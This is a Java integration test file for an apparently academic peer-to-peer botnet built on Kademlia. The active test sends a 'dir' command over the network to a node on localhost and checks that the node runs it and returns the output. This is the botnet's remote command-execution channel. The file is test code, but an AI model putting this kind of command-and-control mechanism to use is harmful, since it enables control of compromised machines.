package botnet_p2p.application_layer;

import botnet_p2p.model.KademliaPeer;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;

import static botnet_p2p.MessageOuterClass.Message;
import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.Assert.assertEquals;

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {Config.class})
public class ApplicationIntegrationTests {


    private static final String SERVER_HOST = "127.0.0.1";
    private static final int SERVER_PORT = 3000;
    private final KademliaPeer me = new KademliaPeer(SERVER_HOST, SERVER_PORT);

    @Autowired
    private ApplicationLayer app;

/*
    @Test
    public void bootstrapTest() throws IOException, InterruptedException {

        new Thread(() -> {
            try {
                // start node
                ApplicationLayer applicationLayer = this.app;

                sleep(500);
                Peer boostrapNode = new Peer("127.0.0.1", 123);
                applicationLayer.launchClient(boostrapNode);

            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();


        // wait for connection from node
        ServerSocket serverSocket = new ServerSocket();
        serverSocket.bind(new InetSocketAddress("127.0.0.1", 123));
        Socket socket = serverSocket.accept();

        // receive data
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(socket.getOutputStream());
        BufferedInputStream bufferedInputStream = new BufferedInputStream(socket.getInputStream());
        byte[] buffer = new byte[512];
        int read = bufferedInputStream.read(buffer);
        ByteBuffer messageBuffer = ByteBuffer.wrap(buffer, 0, read);
        Message receivedMessage = Message.parseFrom(messageBuffer);

        // check message
        assertEquals(receivedMessage.getType(), Message.MessageType.FIND_NODE);


        // send found nodes to node
        Message foundNodes = Protobuf.createFoundNodes(
                new KademliaPeer("127.0.0.1", 123, 44),
                me.toPeer(),
                Arrays.asList(
                        new KademliaPeer("127.11.11.1", 10, 0b01010101),
                        new KademliaPeer("127.11.11.12", 10, 0b00110101),
                        new KademliaPeer("127.11.11.13", 10, 0b00100101),
                        new KademliaPeer("127.11.11.14", 10, 0b01010111),
                        new KademliaPeer("127.11.11.15", 10, 0b10110101),
                        new KademliaPeer("127.11.11.16", 10, 0b00111101),
                        new KademliaPeer("127.11.11.17", 10, 0b00011101)
                )
        );
        foundNodes.writeTo(bufferedOutputStream);
        bufferedOutputStream.flush();

        // wait for bootstraping timeout
        Thread.sleep(12000);

        // ping to node
        Message pingMessage = Protobuf.createPingMessage(
                new KademliaPeer("127.0.0.1", 3000),
                new KademliaPeer("127.0.0.1", 123, 44)
        );
        pingMessage.writeTo(bufferedOutputStream);
        bufferedOutputStream.flush();

        // read response
        read = bufferedInputStream.read(buffer);
        messageBuffer = ByteBuffer.wrap(buffer, 0, read);
        receivedMessage = Message.parseFrom(messageBuffer);


        assertEquals(receivedMessage.getType(), Message.MessageType.PING_RESPONSE);
    }
*/

    @Test
    public void executeCommandTest() throws IOException, InterruptedException {

        new Thread(() -> {
            // start node
            ApplicationLayer applicationLayer = this.app;
            applicationLayer.startWithoutBootstrapping();
        }).start();


        // socket that sends command
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(SERVER_HOST, SERVER_PORT));
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(socket.getOutputStream());

        // initialize test peer and send message
        Message message = Message.newBuilder()
                .setType(Message.MessageType.COMMAND)
                .setSender(
                        Message.Contact.newBuilder()
                                .setIP("127.0.0.1")
                                .setPort(1234)
                                .build()
                )
                .setCommand(
                        Message.CommandMsg.newBuilder()
                                .setCommand("dir")
                                .setShouldRespond(true)
                ).build();
        message.writeTo(bufferedOutputStream);
        bufferedOutputStream.flush();


        // wait for connection from node
        ServerSocket serverSocket = new ServerSocket();
        serverSocket.bind(new InetSocketAddress("127.0.0.1", 1234));
        Socket socketRec = serverSocket.accept();


        // receive data
        BufferedInputStream bufferedInputStream = new BufferedInputStream(socketRec.getInputStream());
        byte[] buffer = new byte[2048];
        int read = bufferedInputStream.read(buffer);
        ByteBuffer messageBuffer = ByteBuffer.wrap(buffer, 0, read);
        Message receivedMessage = Message.parseFrom(messageBuffer);

        // check message
        assertEquals(receivedMessage.getType(), Message.MessageType.COMMAND_RESPONSE);
        assertEquals(Message.Status.OK, receivedMessage.getResponse().getStatus());
        assertThat(receivedMessage.getResponse().getValue()).contains("Volume in drive");
    }
}